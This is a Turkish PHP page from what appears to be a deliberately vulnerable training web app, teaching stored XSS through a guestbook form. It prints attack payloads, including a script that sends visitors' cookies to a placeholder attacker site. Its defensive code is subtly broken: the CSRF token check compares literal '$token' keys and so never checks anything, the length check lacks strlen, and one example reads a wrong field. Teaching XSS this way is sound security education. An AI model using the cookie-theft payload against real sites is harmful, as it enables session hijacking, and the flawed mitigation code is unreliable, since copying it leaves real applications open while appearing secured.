<?php
session_start();

include("pdo-baglanti.php");

?>
<!DOCTYPE html>
<html><head>
<title>Siber Eğitim</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
<meta name="keywords" content="#" />
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/monokai-sublime.min.css">
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" type="text/css" href="css/font-awesome-4.6.3/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="css/animate.min.css">
<link href="https://fonts.googleapis.com/css?family=Armata|Baloo+Bhaina|Josefin+Slab|Righteous|Yellowtail" rel="stylesheet">
<script src="js/jquery.min.js"></script>

<link href="ok.png" rel="shortcut icon" >


</head>
<body style="background:url('blur-bg.jpg') no-repeat center center fixed; background-size:cover;">
	<!-- Header -->
	<!-- Header -->
	<div class="col-xs-12 " style="width:100%; height:3px;background-color:rgba(255,255,255,0.5);position:fixed;top:0; z-index:1000;">
		<div class="col-xs-12 hidden-sm hidden-xs" id="scrollbar" style="transition:all 0.5s linear;height:3px;background-color:rgba(255,0,0,1);position:fixed;top:0;left:0; z-index:1001;">
		</div>
	</div>
	<div class="container-full">

		<div class="col-sm-12 " style="">	
			<a href="xss.php"><div class="btn btn-primary buton-red " style="position:fixed;top:10px;left:3px">
				<i style="font-size:17px"class="fa fa-chevron-circle-left" aria-hidden="true"></i> Geri Dön</div></a>
				<a target="_blank" href="code.php?id=3"><div class="btn btn-primary buton-mor " style="position:fixed;bottom:10px;left:3px"><i class="fa fa-code" aria-hidden="true"></i> 
					Kodu Göster</div></a>


					<ul class="sagustmenu" style="list-style:none; position:absolute;top:0;right:20px">
						<li><a data-toggle="modal" data-target=".bs-example-modal-lg" class="yardim" style="position:fixed;top:0;right:7px;">
							<i class="fa fa-question-circle" aria-hidden="true"></i></a></li>
							<li><a href="/yazlab/" style="position:fixed;top:0;right:40px;"><i class="fa fa-home" aria-hidden="true"></i></a></li>
						</ul>
						
						<div class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" style="">
							<div class="modal-dialog modal-lg" role="document">
								<div class="modal-content" style="padding:15px;font-size:13px;background:rgba(0,0,0,1);line-height:20px;color:#fff;box-shadow:-11px 12px 18px 7px rgba(0, 0, 0, 0.2)">
									<h1 style="text-align:center;">Nedir Bu ?</h1>
									<hr><br/>
									Bu uygulama, kasıtlı olarak bırakılmış güvenlik zafiyetlerini (vulnerability) içeren zayıf (vulnerable) bir web uygulamasıdır.
									Uygulamalı siber güvenlik eğitimlerinde kullanılması için yapılmıştır. 
									Yasal olmayan bir şekilde gerçek sistemlere saldırmadan bu uygulama üzerinde öğrendiklerinizi tecrübe etmeniz açısından hazırlanmıştır.
									Üzerinde zafiyetler bulunan bu web uygulamasında, zafiyetlerin neden kaynaklandığının ve bu zafiyetlerin
									nasıl sömürüleceği açık ve anlaşılır bir şekilde adım adım açıklanmıştır.
								</div>
							</div>
						</div>

					</div>
				</div>
				<div class="container">
					
					
					
					<div class="col-sm-12 bant" style="color:#fff;padding:10px;font-weight:bold;" >
						<h1 style="text-align:center;background:linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%);
						background: -webkit-linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%);">
						<div style="background:linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%);
						background: -webkit-linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%); font-size:25px;font-weight:bold;">
						UYGULAMA-3 / XSS CROSS SITE SCRIPTING STORED VERSION</div> Olası Senaryo</h1>
						<hr>
						<p>
							Uygulamada bir ziyaretçi defteri bulunmaktadır. Hiçbir güvenlik tedbiri alınmadan oluşturulan bu form alanına javascript kodu yerleştirerek bu sayfayı ziyaret eden
							tüm kişilerin cookie bilgilerine ulaşılır.
							<br/>
							<br/>
							Alttaki alanlarda sizden bir isim ve mesaj girilmesi bekleniyor. Bunu görelim.
						</p>
						<div class="col-sm-5"> 
							
							<div class="adimlar" style="font-size:12px;background-color:rgba(0,0,50,0.3);padding:2px 10px;margin-top:10px">
								<i style="padding:3px;font-size:10px; color:#fA6644">Adımları sırayla uygulayıp çalışmayı inceleyiniz.</i>
								<p>
									<h1 style="text-align:center;font-size:22px;">UYGULANACAK ADIMLAR</h1><hr>
								</p>
							</div>
							
							<div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">
								<div class="panel panel-default" id="panel1">
									<div class="panel-heading" role="tab" style="cursor:pointer;" id="headingOne" data-toggle="collapse" data-parent="#accordion" href="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
										<h4 class="panel-title">
											
											ADIM - 1 <i id="" class="fa fa-sort-desc" aria-hidden="true"></i>

											
											
										</h4>
									</div>
									<div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
										<div class="panel-body">
											1- Input alanlarına dilediğiniz girişleri yazarak gönder butonuna tıklayın ve sonucu görün.<br/><br/>
											Görünürde her şey normal gibi. Yapacağımız ilk hamle kodda html etiketleri sınırlandırılmış mı kontrol etmek olacak.
											Input alanlarından herhangi birisine dilediğiniz html etiketini yazarak gönderin.
											<br/><br/>
											Örnek:
											<pre>
												<code class="html">&lt;marquee&gt;XSS açığı var.&lt;/marquee&gt;</code></pre>
												Eğer girilen bu html tag'lı ifade ile çıktıyı şekillendirebiliyorsak XSS açığı var demektir.
											</div>
										</div>
									</div>
									
									<div class="panel panel-default" id="panel2">
										<div class="panel-heading collapsed" role="tab" style="cursor:pointer;"id="headingTwo" data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
											<h4 class="panel-title">
												
												ADIM - 2 <i class="fa fa-sort-desc" aria-hidden="true"></i>
												
											</h4>
										</div>
										<div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
											<div class="panel-body">

												2- Bu tarz gömülü XSS açıklarında genel mantık Javascript kodunu siteye enjekte ederek sayfayı ziyaret eden herkesin cookielerine ulaşmaktır. Şimdi bu olayı ele alalım.
												<br/>
												Input değerine script tag'leri ile javascript kodu enjekte edelim. Bu kod kalıcı olacaktır. 
												<br/><br/>
												Metin Kutusuna Girilecek Kod: <br/><br/>
												<pre>
													<code class="html">&lt;script>alert("Sitede XSS açığı Mevcut ");&lt;/script></code></pre>
													
													Reflected version XSS açığında opera ve chrome tarayıcıları  XSS güvenliği politikası nedeniyle bu şekilde 
													GET ve POST değerlerinden gelen javascript kodlarını çalıştırmıyordu. Ama stored version XSS'de çalıştıracaktır çünkü gelen script kod sisteme enjekte olup kalıcı
													hale gelmiştir. Sayfayı her ziyaret eden kullanıcıda işleyecektir. Tabi işlevin büyüklüğü kodu enjekte eden kişinin hayal gücüne kalmıştır. Tabi hedef cookieler.
												</div>
											</div>
										</div>
										
										<div class="panel panel-default" id="panel3">
											<div class="panel-heading collapsed" role="tab"  style="cursor:pointer;" id="headingThree" data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
												<h4 class="panel-title">
													NELER YAPILABİLİR ? <i class="fa fa-sort-desc" aria-hidden="true"></i>        
												</h4>
											</div>
											<div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
												<div class="panel-body">
													
													<pre><code class="html">&lt;script> window.location.href=”sizin-siteniz.com/index.php?cookie=” + document.cookie;&lt;/script></code></pre>
													Yukarıda görülen koddaki gibi scriptler ile cookielere erişilebilir. Tabi bunun için $_GET[‘cookie’] işlem yapıp yazdırma işlemleri sağlanmalıdır. 
													<br/>
													<br/>
													Bu kod  ziyaretçi defteri bölümüne girilirse kod sisteme enjekte olmuş olacaktır. Ve bu sayfaya giren herkesin cookieleri size ulaşacaktır.
													Reflected version XSS'deki gibi link gönderilmek zorunda değildir.
												</div>
											</div>
										</div>
										<div class="panel panel-default" id="panel4">
											<div class="panel-heading collapsed" role="tab" style="cursor:pointer;"id="headingFour" data-toggle="collapse" data-parent="#accordion" href="#collapseFour" aria-expanded="false" aria-controls="collapseTwo">
												<h4 class="panel-title">
													
													XSS AÇIKLARINI NASIL KAPATIRIM ?<i class="fa fa-sort-desc" aria-hidden="true"></i>
													
												</h4>
											</div>
											<div id="collapseFour" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingFour">
												<div class="panel-body">
													1- Script Kelimesini Sınırlandırma
													<br/><br/>
													Input alanına eğer &lt;script> tag'ı girilmişse bunu silebiliriz. Tam anlamıyla koruma sağlamaz. Aşılma imkanı vardır.
													<br/><br/>
													Kod'a eklenmesi gereken güvenlik önlemi: <br/><br/>
													Güvenlik Seviyesi: <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i>
													<br/><br/>
													
													<pre><code class="php">
														$isim = str_replace( '&lt;script>', '', $_GET[ 'isim' ] );
														$mesaj = str_replace( '&lt;script>', '', $_GET[ 'mesaj' ] );	
														// İsim ve mesaj değişkenlerine ekstra güvenlik önlemi getiriyoruz
														// str_replace fonksiyonu ile girilen değerde &lt;script> varsa onu silip boşluk yazıyoruz.
													</code></pre>
													<br/><br/>
													Bazı inputlar ile rahatça aşılabilir. Bu nedenle ekstra güvenlik önlemi alınmalı.
													<br/>Örnek:<br/><br/>
													<pre><code class="php">&lt;sCrIpT> &lt;/sCrIpT></code></pre><br/>
													<pre><code class="php">&lt;img src="x" error=alert("xss") /></code></pre><br/>

													<hr/>
													<br/>
													Güvenlik Seviyesi: <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i>
													<br/><br/>
													<pre><code class="php">
														$isim = htmlspecialchars(str_replace( '&lt;script>', '', $_GET[ 'isim' ] ));
														$mesaj = htmlspecialchars(str_replace( '&lt;script>', '', $_GET[ 'mesaj' ] ));
														// Daha da iyileştirip html taglerini de etkisiz hale getirebiliriz.
														// htmlspecialchars fonksiyonu sayesinde html tag'leri özel karakterlere çevrilir ve çalışması önlenir.
													</code></pre>
													<br/><br/>
													Güvenlik Seviyesi: <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i>
													<br/><br/>
													Çok daha güvenilir bir web ortamı için " Token " kullanın.
													<pre><code class="php">
														$isim = htmlspecialchars(str_replace( '&lt;script>', '', $_GET[ 'isim' ] ));
														$yas = htmlspecialchars(str_replace( '&lt;script>', '', $_GET[ 'yas' ] ));
														// Daha da iyileştirip html taglerini de etkisiz hale getirebiliriz.
														// htmlspecialchars fonksiyonu sayesinde html tag'leri özel karakterlere çevrilir ve çalışması önlenir.
													</code></pre>
													<br/><br/>
													<i style="font-size:40px;"class="fa fa-user-secret" aria-hidden="true"></i> Ekstra güvenlik hamleleri: <br/><br/>
													
													Üçüncü parti paket yazılımlar kullanılabilir. AntiXSS, HTML Purifer vb. kütüphane yazılımlar kullanabiliriz.
													<br/><br/>
													Tanımlama bilgilerinizde yanlızca HTTPOnly kullanın. Bu kütüphane ile cookielere erişim iznine sadece HTTPOnly bayrağı taşıyan hareketler erişebilir.
													<br/><br/>
													Input alanlarına girilecek karakter sınırlarını html kodlar içinde belirtmeyin. Çünkü bu değer tarayıcıların geliştirici menüsü kısmından değiştirilip fazla karakter girme
													imkanı sağlanabilir.<br/><br/>
													<pre><code class="html">&lt;input name="isim" type="text" required size="30" maxlength="20"> 
														&lt;!-- maxlength attribute'ü ile girilebilecek maksimum karakter değeri 20 olarak belirlenmiş.-->
														&lt;!--Dediğimiz gibi bu değer değiştirilebilir. O yüzden güvenli bir yöntem değil.-->
													</code></pre><br/><br/>
													Bu nedenle bu kontrolleri veritabanı tabloları hazırlarken tablo özelliklerinde belirtin. Ayrıca formdan gelen verileri if else kontrol bloklarına alarak
													uzunluk, veri tipi kontrolleri yapılabilir.<br/><br/>
													<pre><code class="php">if($_POST['isim'] < 20){
														//yapılacak komutlar
													}</code></pre>
													
												</div>
											</div>
										</div>
										
									</div>
								</div>
								<div class="col-sm-3" > 
									<?php 
		session_start(); // Session başlatıyoruz.
		$token = $_SESSION['token'] = md5(uniqid(mt_rand(),true)); 
		// Bir token değişkeni oluşturduk ve bunu session token'a eşitledik.
		// Token'i mt_rand() fonksiyonu ile rastgele sayı oluşturup uniqid() fonksiyonuna girdi olarak veriyoruz. Benzersiz bir sayı elde ediyoruz.
		// Eşsiz bir sayı elde etmek içinde md5 şifreleme fonksiyonuna girdi olarak veriyoruz. 
		
		if(isset($_POST['gonder2'])){ //Eğer post varsa aşağıdaki işlemleri yap.
			
			if(isset($_SESSION['token']) && $_POST['$token'] == $_SESSION['$token']){ 
		// Eğer session'dan gelen token varsa ve posttan gelen token session'dan gelen token'a eşitse aşağıdaki işlemleri yap.
		$isim = htmlspecialchars(trim( $_POST['isim']),ENT_QUOTES); //post ile gelen verileri trim ile boşluktan arındırıp htmlspecialchars() fonksiyonu ile html taglarını önlüyoruz.
		$mesaj = htmlspecialchars(trim( $_POST['mesaj']),ENT_QUOTES); // ENT_QUOTES parametresi ' işaretinin ascii code'a dönüştürüleceğini ifade ediyor.
		$tarih = date('d.m.Y H:i'); //date fonksiyonu ile tarihi alıyoruz.
		if($isim != ''){ //İsim boş değilse işlemleri yap.
			$ekle = $db->prepare( 'INSERT INTO  mesajlar (id, isim, mesaj,tarih) VALUES ( null,:isim, :mesaj, :tarih );' ); 
				// SQL injection'dan arındırmak amacıyla PDO sınıfı ile ekleme işlemi yaptırılıyor.
			$ekle->bindParam( ':isim', $isim, PDO::PARAM_STR ); 
			$ekle->bindParam( ':mesaj', $mesaj, PDO::PARAM_STR ); 
			$ekle->bindParam( ':tarih', $tarih, PDO::PARAM_STR ); 
			$ekle->execute(); 
			
			if($ekle){
					echo'tamam';//Eklediyse sayfayı yeniliyoruz.

				}else{
					echo'eklenemedi';//Eklenemediyse ekrana eklenemedi yazdır.
				}
			}
		}else{
			
			echo'token yanlis';
		}
		

		
	}
	
	?>
	<form   style="margin-bottom:20px;" action="" method="post" class="form" name="form2">
		<h1 style="margin-top:10px;text-align:center;font-size:19px; font-weight:bold;">Hey Ziyaretçi Anlat İçinden Geçenleri</h1>
		<input type="hidden"  name="token" value="<?php echo $token; ?>"><br/>
		<input type="text" class="uyg" placeholder="İsminizi Giriniz..." required="" name="isim" style="min-width:247px;"><br/>
		<textarea type="text" class="uyg" placeholder="Mesajınızı giriniz..." required="" name="mesaj" style="resize: none;"cols="26" rows="10"></textarea><br/>
		<center>
			<input type="submit" class="btn btn-primary buton-mor gonder" name="gonder2" value="Gönder">
		</center>
	</form>                
	
	
</div>
<div class="col-sm-4 liste_alani"style="min-height:400px;">		
	
	<?php
	
	$sqlsorgu = $db->query("SELECT * FROM mesajlar",PDO::FETCH_ASSOC);
	if ( $sqlsorgu->rowCount() > 0 ){
		$sayi =	$sqlsorgu->rowCount();
		$sayi = $sayi - 1 ;
		echo '<div class="col-sm-12" style="text-align:center;background:rgba(0,0,100,0.2); max-width:530px;border-radius:10px;"> Senden önce '.$sayi.' kişi mesaj yazdı.</div>';
		echo $token;

		foreach( $sqlsorgu as $yazdir ){
			$id = $yazdir['id'];
			$isim =htmlspecialchars($yazdir['isim']);
			$mesaj = htmlspecialchars($yazdir['mesaj']);
			$tarih = $yazdir['tarih'];
			if($id % 2 == 0){
				?>
				<div id="<?php echo 'alan'.$id ?>"style="background:rgba(0,0,0,0.2); padding:10px;margin-bottom:4px;font-weight:100;">
					<span style="font-weight:bold;color:lightgreen"><?php echo $isim; ?></span> <span style="color:red"><?php echo "az önce"; ?></span>  dedi ki; <br/>
					<br/>
					<?php echo $mesaj; ?>
					
					
				</div>	
				<?php
			}else{
				?>
				<div id="<?php echo 'alan'.$id ?>"style="background:rgba(0,0,0,0.5);padding:10px; margin-bottom:4px;font-weight:100;">
					<span style="font-weight:bold;color:lightgreen"><?php echo $isim; ?></span> <span style="color:red"><?php echo "3 saat önce"; ?></span> dedi ki; <br/>
					<br/>
					<?php echo $mesaj; ?>
					
					
				</div>	
				<?php
			}
			
		}
	}?>
	
	
</div>
</div>


<!-- Header -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/sql.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script src="js/bootstrap.min.js"></script>
<script src="js/script.js"></script>
<script src="js/jquery.teletype.js"></script>
<script>

	$(function(){
		
		$(".panel-heading").click(function(){
			var a = $(this).find("i");

			if(a.hasClass("fa-sort-desc")){
				
				$(this).find(".fa-sort-desc").removeClass("fa-sort-desc").addClass("fa-sort-asc");
			}else{
				$(this).find(".fa-sort-asc").removeClass("fa-sort-asc").addClass("fa-sort-desc");
			}

		});

	/*
var a = $(".adimlar span").size();


var sayac = 1;

$(".fa-arrow-down").click(function(){
	
	sayac++;
	var yeniadim = '#adim'+sayac;
	if(sayac<=a){
	
	$(".adimlar "+yeniadim ).css("visibility","visible");

	}else{
		$(".tebrikler").css("visibility","visible");
		sayac=a;
	}
	
});
$(".fa-arrow-up").click(function(){
	
	
	var yeniadim = '#adim'+sayac;
	if(sayac>1){
	
	$(".adimlar "+yeniadim ).css("visibility","hidden");
	sayac--;
	}
	if(sayac==7){
		$(".tebrikler").css("visibility","hidden");
		sayac=6;
	}
	
});

*/
/*.css("visibility","hidden");*/


var height = $("body").height();

$(".bant").css("min-height",height);
$(window).resize(function(){
	var height = $("body").height();

	$(".bant").css("min-height",height);
});


});

	$(".play").click(function(){
		var height = $("body").height();
		$('html, body').animate({
			scrollTop:height,
			
		},2000,'easeInOutBack');
		$(".icerik").addClass("animated fadeOutUp");

		
		setTimeout(function() { $('.icerik').removeClass("fadeOutUp").addClass("animated fadeIn "); },3000);
	});
	$(".ilkuyg").click(function(){
		var height = $("body").height();
		$('html, body').animate({
			scrollTop:height*2,
			
		},2000,'easeInOutBack');
	});

</script>

</body>
</html>